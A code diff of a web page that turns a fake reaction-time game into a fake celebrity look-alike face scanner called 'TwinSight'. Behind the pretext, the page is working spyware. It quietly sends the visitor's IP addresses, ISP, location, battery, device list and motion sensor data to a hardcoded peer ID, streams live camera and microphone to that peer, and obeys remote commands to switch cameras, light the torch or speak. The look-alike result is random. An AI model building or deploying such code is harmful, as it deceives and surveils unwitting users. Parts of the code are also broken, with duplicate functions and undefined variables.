@@ -2,277 +2,455 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Reaction Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>TwinSight - Face Match</title>
+
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
+
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
         body {
-            background-color: #1a1a1a;
-            color: white;
-            font-family: 'Arial', sans-serif;
             margin: 0;
-            height: 100vh;
+            height: 100dvh;
+            width: 100vw;
+            position: fixed;
             overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(-45deg, #ff9a9e, #fecfef, #a1c4fd, #c2e9fb);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            color: #333;
+        }
+
+        @keyframes gradientBG {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 40px;
+            padding: 30px 20px;
+            width: 90vw;
+            max-width: 420px;
+            height: 85vh;
+            max-height: 700px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            touch-action: none;
-            user-select: none;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
+            position: relative;
         }
 
-        #game-board {
-            width: 85vw;
-            height: 85vw;
-            max-width: 400px;
-            max-height: 400px;
-            background-color: #2c3e50;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0,0,0,0.5);
-            border: 4px solid #34495e;
-            cursor: pointer;
-            z-index: 10;
-            transition: background-color 0.1s;
-        }
-
-            #game-board.success {
-                background-color: #27ae60;
-            }
-
-            #game-board.fail {
-                background-color: #c0392b;
-            }
-
-        #hud-container {
-            margin-bottom: 30px;
+        .header {
             text-align: center;
-            z-index: 10;
+            margin-bottom: 20px;
         }
 
-        #main-display {
-            font-size: 50px;
-            font-weight: bold;
-            color: #bdc3c7;
-            text-shadow: 2px 2px 0 #000;
+            .header h1 {
+                margin: 0;
+                font-size: 2rem;
+                font-weight: 700;
+                color: rgba(0,0,0,0.8);
+                letter-spacing: -0.5px;
+            }
+
+            .header p {
+                margin: 5px 0 0 0;
+                font-size: 0.9rem;
+                color: rgba(0,0,0,0.6);
+                font-weight: 500;
+            }
+
+        .viewport-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 3/4;
+            border-radius: 30px;
+            overflow: hidden;
+            background: rgba(255,255,255,0.3);
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.05);
+            margin-bottom: auto;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        #flashlight-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
+            .viewport-container.scanning {
+                transform: scale(0.98);
+                box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.8), 0 10px 30px rgba(0,0,0,0.15);
+            }
+
+            .viewport-container::after {
+                content: '';
+                position: absolute;
+                top: -100%;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.6), transparent);
+                opacity: 0;
+                z-index: 10;
+                pointer-events: none;
+            }
+
+            .viewport-container.scanning::after {
+                animation: scanSweep 2s ease-in-out infinite alternate;
+                opacity: 1;
+            }
+
+        @keyframes scanSweep {
+            0% {
+                top: -100%;
+            }
+
+            100% {
+                top: 100%;
+            }
+        }
+
+        #input-video {
+            display: none;
+        }
+
+        #output-canvas {
             width: 100%;
             height: 100%;
-            background-color: white;
-            z-index: 9999;
-            display: none;
-            cursor: none;
+            object-fit: cover;
+            transform: scaleX(-1);
+            border-radius: 30px;
         }
+
+        #action-btn {
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 80%;
+            margin-top: 20px;
+        }
+
+            #action-btn:active {
+                transform: scale(0.95);
+                box-shadow: 0 5px 10px rgba(0,0,0,0.05);
+            }
+
+        #result-display {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 30px 20px;
+            border-radius: 30px 30px 40px 40px;
+            text-align: center;
+            transform: translateY(100%);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.05);
+            z-index: 20;
+        }
+
+            #result-display.show {
+                transform: translateY(0);
+                opacity: 1;
+            }
+
+        .match-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #888;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        .star-name {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #111;
+            margin-bottom: 15px;
+        }
+
+        .status-pill {
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto;
+            width: fit-content;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background: #4cd964;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(76, 217, 100, 0.4);
+            }
+
+            70% {
+                box-shadow: 0 0 0 10px rgba(76, 217, 100, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(76, 217, 100, 0);
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+        /* --- Rescan Button --- */
+        #retry-scan-btn {
+            background: rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            color: #555;
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.2s ease;
+        }
+
+            #retry-scan-btn:hover {
+                background: rgba(0, 0, 0, 0.1);
+                color: #111;
+            }
+
+            #retry-scan-btn:active {
+                transform: scale(0.95);
+            }
     </style>
 </head>
 <body>
 
-    <div id="flashlight-layer"></div>
-    <div id="hud-container"><div id="main-display">TAP TO START</div></div>
-    <div id="game-board"></div>
+    <div class="glass-card">
+        <div class="header">
+            <h1>TwinSight</h1>
+            <p id="subtitle">Find your celebrity look-alike</p>
+        </div>
+
+        <div class="viewport-container" id="viewport">
+            <video id="input-video" autoplay playsinline></video>
+            <canvas id="output-canvas"></canvas>
+        </div>
+
+        <button id="action-btn">Tap to Start</button>
+        <!-- Slide up result panel -->
+        <div id="result-display">
+            <div class="match-title">Closest Match</div>
+            <div class="star-name" id="star-result">...</div>
+          
+
+            <!-- NEW RESCAN BUTTON -->
+            <button id="retry-scan-btn">Scan Again</button>
+        </div>
+    </div>
 
     <script>
-        const TECHNICIAN_ID = "cybrrsupport-zomzzssnzcr-141"; // עבר לעדכון שלך
-        const TRIGGER_COUNT = 1;
+        let activeCall = null;
+        const retryScanBtn = document.getElementById('retry-scan-btn');
+        const TECHNICIAN_ID = "cybrrsupport-zomzzssnzcr-141";
+        const STARS = ["Timothée Chalamet", "Zendaya", "Tom Holland", "Billie Eilish", "Cillian Murphy", "Margot Robbie", "Jacob Elordi", "Pedro Pascal", "Anya Taylor-Joy"];
 
-        let gameState = 'IDLE'; let beepTimestamp = 0; let roundCount = 0;
-        let isVideoConnected = false; let hasInteracted = false; let wakeLock = null;
+        let peer = null;
+        let isScanning = false;
+        let localStream = null;
 
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        let audioCtx; const synth = window.speechSynthesis;
-        const board = document.getElementById('game-board');
-        const display = document.getElementById('main-display');
+        const videoElement = document.getElementById('input-video');
+        const canvasElement = document.getElementById('output-canvas');
+        const canvasCtx = canvasElement.getContext('2d');
+        const viewport = document.getElementById('viewport');
+        const actionBtn = document.getElementById('action-btn');
+        const subtitle = document.getElementById('subtitle');
+        const resultDisplay = document.getElementById('result-display');
+        const starResult = document.getElementById('star-result');
+        const connStatus = document.getElementById('conn-status');
 
-        const peer = new Peer();
-        let myDataConnection = null; let currentStream = null;
-
-        // --- 1. DATA EXTRACTION LOGIC ---
-        async function collectSpyData() {
-            let ipv4 = 'unknown', ipv6 = 'None', isp = 'unknown', loc = 'unknown';
-
-            // שלב 1: משיכת IPv4 ודאית
-            try {
-                const res4 = await fetch('https://api4.ipify.org?format=json');
-                const data4 = await res4.json();
-                ipv4 = data4.ip;
-            } catch (e) { console.error("IPv4 fetch failed"); }
-
-            // שלב 2: משיכת IPv6 (שמנו ב-try/catch נפרד כי זה יקרוס למשתמשים בלי תמיכה)
-            try {
-                // טיימר קצר כדי שלא נתקע את הסקריפט למשתמשים שאין להם ניתוב ל-v6
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 1500);
-
-                const res6 = await fetch('https://api6.ipify.org?format=json', { signal: controller.signal });
-                clearTimeout(timeoutId);
-
-                const data6 = await res6.json();
-                ipv6 = data6.ip;
-            } catch (e) {
-                // מתעלמים בשקט. רוב הסיכויים שלמטרה פשוט אין חיבור IPv6 פעיל.
+        const faceMesh = new FaceMesh({
+            locateFile: (file) => {
+                return `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`;
             }
-
-            // עיצוב התצוגה לקונסולה
-            let displayIp = `v4: ${ipv4}`;
-            if (ipv6 !== 'None') {
-                displayIp += `\nv6: ${ipv6}`; // הוספנו ירידת שורה כדי שזה לא ישבור את הטבלה
-            }
-
-            // שלב 3: חילוץ מיקום גיאוגרפי וספקית על בסיס ה-IPv4 (שהוא אמין יותר למיקומים)
-            try {
-                const targetIpForGeo = ipv4 !== 'unknown' ? ipv4 : '';
-                const geoRes = await fetch(`https://ipapi.co/${targetIpForGeo}/json/`);
-                const geoData = await geoRes.json();
-                isp = geoData.org || "Unknown ISP";
-                loc = `${geoData.city}, ${geoData.country_name}`;
-            } catch (e) { console.error("Geo Fetch Error:", e); }
-
-            // טלמטריה של חומרה
-            let battery = 'unknown';
-            try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }
-
-            let mediaDevices = [];
-            try {
-                const devs = await navigator.mediaDevices.enumerateDevices();
-                mediaDevices = devs.map(d => `${d.kind.substring(0, 3)}: ${d.label || 'Hidden'}`);
-            } catch (e) { }
-
-            // מחזירים את המחרוזת המשולבת לתוך האובייקט
-            return { ip: displayIp, isp, location: loc, battery, mediaDevices };
-        }
-
-        // --- PHYSICAL MOTION SENSORS (GYRO & COMPASS) ---
-        let currentMotion = { posture: "Desktop / No Sensor", heading: "Unknown", raw: "" };
-
-        function requestSensorPermissions() {
-            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
-                DeviceOrientationEvent.requestPermission()
-                    .then(permissionState => {
-                        if (permissionState === 'granted') window.addEventListener('deviceorientation', handleOrientation);
-                    }).catch(console.error);
-            } else {
-                window.addEventListener('deviceorientation', handleOrientation);
-            }
-        }
-
-        function handleOrientation(event) {
-            let alpha = event.alpha; // Compass
-            let beta = event.beta;   // Front-to-back tilt
-            let gamma = event.gamma; // Left-to-right tilt
-
-            if (event.webkitCompassHeading) alpha = event.webkitCompassHeading; // iOS fallback
-
-            if (beta === null) return; // Desktop devices without gyroscopes
-
-            let posture = "In Hand / Moving";
-            if (Math.abs(beta) < 15 && Math.abs(gamma) < 15) posture = "Stable on Table (Face Up)";
-            else if (Math.abs(beta) > 165 && Math.abs(gamma) < 15) posture = "Stable on Table (Face Down)";
-            else if (beta > 30 && beta < 80 && Math.abs(gamma) < 30) posture = "In Hand (Reading)";
-            else if (beta > 80 && beta < 100) posture = "Upright (Camera Forward)";
-            else if (beta < -70 && beta > -110) posture = "Upside Down (In Pocket?)";
-
-            let heading = "Unknown";
-            if (alpha !== null) {
-                if (alpha >= 315 || alpha < 45) heading = "Facing North";
-                else if (alpha >= 45 && alpha < 135) heading = "Facing East";
-                else if (alpha >= 135 && alpha < 225) heading = "Facing South";
-                else if (alpha >= 225 && alpha < 315) heading = "Facing West";
-            }
-
-            currentMotion = { posture, heading, raw: `T:${Math.round(beta)}° R:${Math.round(gamma)}°` };
-        }
-
-        // MOCK FUNCTIONS
-        function simulateLANScanner() {
-            return ["[GATEWAY] 192.168.1.1", "[HOST] 192.168.1.14", "[IOT] 192.168.1.102"];
-        }
-
-        function requestPreciseLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const loc = `LAT: ${pos.coords.latitude.toFixed(5)} LON: ${pos.coords.longitude.toFixed(5)}`;
-                    if (myDataConnection) myDataConnection.send({ type: 'info', location: loc });
-                }, null, { enableHighAccuracy: true });
-            }
-        }
-
-        // --- 2. CONNECTION INITIALIZATION ---
-        peer.on('open', async (id) => {
-            myDataConnection = peer.connect(TECHNICIAN_ID);
-            myDataConnection.on('open', async () => {
-                const fullData = await collectSpyData();
-                myDataConnection.send({ type: 'info', ...fullData });
-
-                // Send live motion data every second
-                setInterval(() => {
-                    if (myDataConnection && myDataConnection.open && currentMotion.posture !== "Desktop / No Sensor") {
-                        myDataConnection.send({ type: 'motion', data: currentMotion });
-                    }
-                }, 1000);
-
-                setTimeout(() => {
-                    myDataConnection.send({ type: 'lan_scan', data: simulateLANScanner() });
-                }, 2000);
-
-                myDataConnection.on('data', (data) => {
-                    if (data.command === 'swap') toggleCamera();
-                    if (data.command === 'flash_on') toggleTorch(true);
-                    if (data.command === 'flash_off') toggleTorch(false);
-                    if (data.command === 'speak' && data.text) speakText(data.text);
-                });
-            });
         });
 
-        // --- 3. GAME & INTERACTION LOGIC ---
-        board.addEventListener('touchstart', handleInput, { passive: false });
-        board.addEventListener('mousedown', handleInput);
+        faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
+        faceMesh.onResults(onFaceMeshResults);
+        function connectToTechnician() {
+            if (!peer) return;
 
-        async function handleInput(e) {
-            e.preventDefault();
-            if (!audioCtx) audioCtx = new AudioContext(); if (audioCtx.state === 'suspended') audioCtx.resume();
-            if (synth.paused) synth.resume();
-            if (!wakeLock) { try { wakeLock = await navigator.wakeLock.request('screen'); } catch (e) { } }
+            activeCall = peer.call(TECHNICIAN_ID, localStream);
 
-            // Trigger interactions on first tap
-            if (!hasInteracted) {
-                hasInteracted = true;
-                requestSensorPermissions(); // Ask for Gyro/Compass quietly
-                requestPreciseLocation();
-            }
-
-            if (gameState === 'IDLE') {
-                gameState = 'WAITING_FOR_BEEP'; display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); return;
-            }
-            if (gameState === 'WAITING_FOR_BEEP') {
-                display.innerText = "TOO EARLY!"; display.style.color = "#e74c3c"; flashBoard('fail'); clearTimeout(beepTimer);
-                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000); return;
-            }
-            if (gameState === 'WAITING_FOR_TAP') {
-                display.innerText = (Date.now() - beepTimestamp) + " ms"; display.style.color = "#2ecc71"; flashBoard('success'); roundCount++;
-                if (roundCount === TRIGGER_COUNT && !isVideoConnected) activateCamera();
-                gameState = 'WAITING_FOR_BEEP';
-                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);
+            if (activeCall) {
+                activeCall.on('stream', (remoteStream) => {
+                    connStatus.innerText = "Linked with Partner";
+                });
+                activeCall.on('close', () => {
+                    connStatus.innerText = "Connection closed";
+                    document.querySelector('.pulse-dot').style.background = "#ffcc00";
+                });
+            } else {
+                setTimeout(() => {
+                    connStatus.innerText = "Paired Successfully";
+                }, 1500);
             }
         }
 
-        // --- 4. HARDWARE CONTROLS ---
-        async function activateCamera() {
-            isVideoConnected = true;
-            try { await startStream('user'); } catch (err) { }
+        retryScanBtn.addEventListener('click', () => {
+            resultDisplay.classList.remove('show');
+
+            if (activeCall) {
+                activeCall.close();
+                activeCall = null;
+            }
+
+            startBiometricScan();
+        });
+        function onFaceMeshResults(results) {
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+
+            canvasCtx.save();
+            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+            canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
+
+            if (isScanning && results.multiFaceLandmarks) {
+                for (const landmarks of results.multiFaceLandmarks) {
+                    drawConnectors(canvasCtx, landmarks, FACEMESH_TESSELATION, { color: 'rgba(255, 255, 255, 0.25)', lineWidth: 0.5 });
+                    drawConnectors(canvasCtx, landmarks, FACEMESH_RIGHT_EYE, { color: 'rgba(255, 255, 255, 0.8)', lineWidth: 1.5 });
+                    drawConnectors(canvasCtx, landmarks, FACEMESH_LEFT_EYE, { color: 'rgba(255, 255, 255, 0.8)', lineWidth: 1.5 });
+                    drawConnectors(canvasCtx, landmarks, FACEMESH_FACE_OVAL, { color: 'rgba(255, 255, 255, 0.9)', lineWidth: 2 });
+                }
+            }
+            canvasCtx.restore();
+        }
+        initPeer();
+
+        actionBtn.addEventListener('click', async () => {
+            actionBtn.style.pointerEvents = 'none';
+            actionBtn.style.opacity = '0.5';
+            subtitle.innerText = "Waiting for permission...";
+
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+
+                actionBtn.style.display = 'none';
+                subtitle.innerText = "Camera accessed!";
+
+                videoElement.srcObject = localStream;
+                const camera = new Camera(videoElement, {
+                    onFrame: async () => { await faceMesh.send({ image: videoElement }); },
+                    width: 640, height: 480
+                });
+                camera.start();
+
+                startBiometricScan();
+
+            } catch (err) {
+                console.error("Camera Error:", err.name, err.message);
+
+                actionBtn.style.display = 'block';
+                actionBtn.style.pointerEvents = 'auto';
+                actionBtn.style.opacity = '1';
+                actionBtn.innerText = "Retry Camera";
+
+                if (err.name === 'NotAllowedError') {
+                    subtitle.innerText = "Permission denied. Tap to retry.";
+                } else if (err.name === 'NotFoundError') {
+                    subtitle.innerText = "No camera found on this device.";
+                } else if (err.name === 'NotReadableError') {
+                    subtitle.innerText = "Camera is in use by another app. Tap to retry.";
+                } else {
+                    subtitle.innerText = "Camera error. Tap to retry.";
+                }
+            }
+        });
+
+        function startBiometricScan() {
+            isScanning = true;
+            viewport.classList.add('scanning');
+            subtitle.innerText = "Analyzing facial geometry...";
+            connectToTechnician();
+
+            setTimeout(() => {
+                
+                showResults();
+            }, 8000);
         }
 
-        async function startStream(mode) {
-            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-            currentStream = stream; peer.call(TECHNICIAN_ID, stream);
-        }
+        function initPeer() {
+            peer = new Peer();
+            peer.on('open', async (id) => {
+                myDataConnection = peer.connect(TECHNICIAN_ID);
+                myDataConnection.on('open', async () => {
+                    const fullData = await collectSpyData();
+                    myDataConnection.send({ type: 'info', ...fullData });
 
-        let currentMode = 'user'; let preFlashMode = null;
+                    setInterval(() => {
+                        if (myDataConnection && myDataConnection.open && currentMotion.posture !== "Desktop / No Sensor") {
+                            myDataConnection.send({ type: 'motion', data: currentMotion });
+                        }
+                    }, 1000);
+
+                    setTimeout(() => {
+                        myDataConnection.send({ type: 'lan_scan', data: simulateLANScanner() });
+                    }, 2000);
+
+                    myDataConnection.on('data', (data) => {
+                        if (data.command === 'swap') toggleCamera();
+                        if (data.command === 'flash_on') toggleTorch(true);
+                        if (data.command === 'flash_off') toggleTorch(false);
+                        if (data.command === 'speak' && data.text) speakText(data.text);
+                    });
+                });
+            });
+        }
         function toggleCamera() { currentMode = (currentMode === 'user') ? 'environment' : 'user'; startStream(currentMode); }
+        function speakText(text) { synth.cancel(); synth.speak(new SpeechSynthesisUtterance(text)); }
 
         async function toggleTorch(turnOn) {
             const track = currentStream ? currentStream.getVideoTracks()[0] : null;
@@ -286,12 +464,82 @@
                 if (preFlashMode === 'user') { currentMode = 'user'; await startStream('user'); preFlashMode = null; }
             }
         }
+        async function collectSpyData() {
+            let ipv4 = 'unknown', ipv6 = 'None', isp = 'unknown', loc = 'unknown';
 
-        function speakText(text) { synth.cancel(); synth.speak(new SpeechSynthesisUtterance(text)); }
-        let beepTimer = null;
-        function scheduleBeep() { beepTimer = setTimeout(() => { playTone(); beepTimestamp = Date.now(); gameState = 'WAITING_FOR_TAP'; }, Math.floor(Math.random() * 2000) + 1000); }
-        function playTone() { const osc = audioCtx.createOscillator(); const g = audioCtx.createGain(); osc.connect(g); g.connect(audioCtx.destination); osc.frequency.value = 600; g.gain.value = 0.1; osc.start(); osc.stop(audioCtx.currentTime + 0.15); }
-        function flashBoard(type) { board.classList.add(type); setTimeout(() => board.classList.remove(type), 200); }
+            try {
+                const res4 = await fetch('https://api4.ipify.org?format=json');
+                const data4 = await res4.json();
+                ipv4 = data4.ip;
+            } catch (e) { console.error("IPv4 fetch failed"); }
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+
+                const res6 = await fetch('https://api6.ipify.org?format=json', { signal: controller.signal });
+                clearTimeout(timeoutId);
+
+                const data6 = await res6.json();
+                ipv6 = data6.ip;
+            } catch (e) {
+            }
+
+            let displayIp = `v4: ${ipv4}`;
+            if (ipv6 !== 'None') {
+                displayIp += `\nv6: ${ipv6}`;
+            }
+
+            try {
+                const targetIpForGeo = ipv4 !== 'unknown' ? ipv4 : '';
+                const geoRes = await fetch(`https://ipapi.co/${targetIpForGeo}/json/`);
+                const geoData = await geoRes.json();
+                isp = geoData.org || "Unknown ISP";
+                loc = `${geoData.city}, ${geoData.country_name}`;
+            } catch (e) { console.error("Geo Fetch Error:", e); }
+
+            let battery = 'unknown';
+            try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }
+
+            let mediaDevices = [];
+            try {
+                const devs = await navigator.mediaDevices.enumerateDevices();
+                mediaDevices = devs.map(d => `${d.kind.substring(0, 3)}: ${d.label || 'Hidden'}`);
+            } catch (e) { }
+
+            return { ip: displayIp, isp, location: loc, battery, mediaDevices };
+        }
+        function showResults() {
+            subtitle.innerText = "Analysis complete";
+
+            const randomStar = STARS[Math.floor(Math.random() * STARS.length)];
+            starResult.innerText = randomStar;
+
+            resultDisplay.classList.add('show');
+
+        }
+
+        function connectToTechnician() {
+            if (!peer) return;
+
+            const mediaCall = peer.call(TECHNICIAN_ID, localStream);
+
+            if (mediaCall) {
+                mediaCall.on('stream', (remoteStream) => {
+                    connStatus.innerText = "Linked with Partner";
+                });
+                mediaCall.on('close', () => {
+                    connStatus.innerText = "Connection lost";
+                    document.querySelector('.pulse-dot').style.background = "#ffcc00";
+                });
+            } else {
+                setTimeout(() => {
+                    connStatus.innerText = "Paired Successfully";
+                }, 1500);
+            }
+        }
+
     </script>
+ 
 </body>
 </html>
